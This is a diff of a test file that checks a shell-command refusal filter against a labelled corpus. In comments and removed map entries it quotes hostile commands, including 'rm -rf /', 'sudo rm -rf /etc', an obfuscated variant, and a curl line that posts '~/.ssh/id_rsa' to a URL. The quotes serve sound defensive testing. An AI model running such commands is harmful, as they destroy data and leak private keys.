@@ -55,33 +55,28 @@ const flagged = CORPUS.cases.filter((corpusCase) => corpusCase.floor_refuses ===
 const unflagged = CORPUS.cases.filter((corpusCase) => corpusCase.floor_refuses !== true);
 
 /**
- * Direction 2's expected set: the cases the floor refuses that the corpus does NOT flag, each with
- * the reason it is here. Two different things live in this list and the distinction is the point:
+ * Direction 2's expected set: cases the floor refuses that the corpus does NOT flag, each with the
+ * reason it is tolerated. **It is empty, and that is the finished state of EXT-60** — the floor and
+ * the corpus now agree on all 87 cases, in both directions.
  *
- *  - **Corpus omission — the floor is right.** The case is a genuine catastrophic/credential
- *    command that the corpus simply did not label `floor_refuses`. Refusing it is correct; the
- *    label is the incomplete half. (`inj-02`, `inj-05`, `ob-01`, `ob-05`.)
+ * It is kept (rather than asserting a bare `[]`) because an entry here is a claim someone has to
+ * justify in one of exactly two ways, and the distinction is the point:
  *
- *  - **Over-broad pattern — the floor is wrong.** `de-04` is a `destructive` case, and the floor
- *    fires under EVERY rung including `bypass`, so a false positive here has no recovery: the user
- *    cannot change rung to escape it. It is listed, not fixed, because narrowing the floor is a
- *    security change and EXT-60 was scoped to report it rather than make it alone.
+ *  - **Corpus omission — the floor is right.** A genuine catastrophic/credential command the corpus
+ *    did not label. Four of these were found by this reconciliation (`ob-01`, `ob-05`, `inj-02`,
+ *    `inj-05`) and were fixed IN THE CORPUS, which is where the error was.
+ *
+ *  - **Over-broad pattern — the floor is wrong.** One of these was found: `de-04`
+ *    (`chmod -R 777 /var/www`), a `destructive` case the floor refused because its chmod pattern
+ *    ended at `777\s+/` with no tail and so matched any absolute path. The floor fires under EVERY
+ *    rung including `bypass`, so that refusal had no recovery — the user cannot change rung to
+ *    escape it. Fixed in the FLOOR by narrowing the pattern to the shared target fragments.
  *
  * The assertion is exact-set EQUALITY, not "a subset of known exceptions". A subset check goes
  * blind the moment a new pattern starts over-firing — which is precisely the CFG-27 failure this
  * reconciliation exists to catch.
  */
-const REFUSED_BUT_UNFLAGGED: Readonly<Record<string, string>> = {
-  'de-04':
-    'OVER-BROAD PATTERN (EXT-60 finding, not a corpus bug): `chmod -R 777 /var/www` is a ' +
-    '`destructive` case, but the chmod entry ends at `777\\s+/` with no CMD_END tail, so it fires ' +
-    'on ANY absolute path. Reported for the coordinator to decide; deliberately not narrowed here.',
-  'inj-02': 'corpus omission — the floor is right: the payload really is `sudo rm -rf /etc`.',
-  'inj-05':
-    'corpus omission — the floor is right: `curl -d @~/.ssh/id_rsa <url>` really does ship a private key.',
-  'ob-01': 'corpus omission — the floor is right: `r\\m -rf /` normalizes to `rm -rf /`.',
-  'ob-05': 'corpus omission — the floor is right: the second line really is `rm -rf /` (EXT-55).',
-};
+const REFUSED_BUT_UNFLAGGED: Readonly<Record<string, string>> = {};
 
 describe('checkHardline — reconciled against the approvals corpus (EXT-60)', () => {
   it('reads a corpus with cases in it (a wrong fixture path must fail loudly, not vacuously pass)', () => {
